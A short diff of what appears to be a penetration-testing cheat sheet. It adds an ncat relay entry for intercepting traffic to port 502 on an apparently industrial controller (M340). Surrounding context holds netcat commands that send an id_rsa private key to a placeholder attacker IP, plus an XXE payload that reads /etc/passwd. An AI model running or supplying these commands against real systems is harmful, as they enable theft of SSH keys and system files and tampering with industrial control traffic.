@@ -352,6 +352,9 @@ EXFILTRATE
 nc <YOUR IP> <PORT> < id_rsa
 nc -nlvp <PORT> > id_rsa
 
+MITM/PROXY NETCAT
+ncat --sh-exec "ncat.exe IPofM340 502" -lk 502
+
 XXE
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
            <bugreport>  
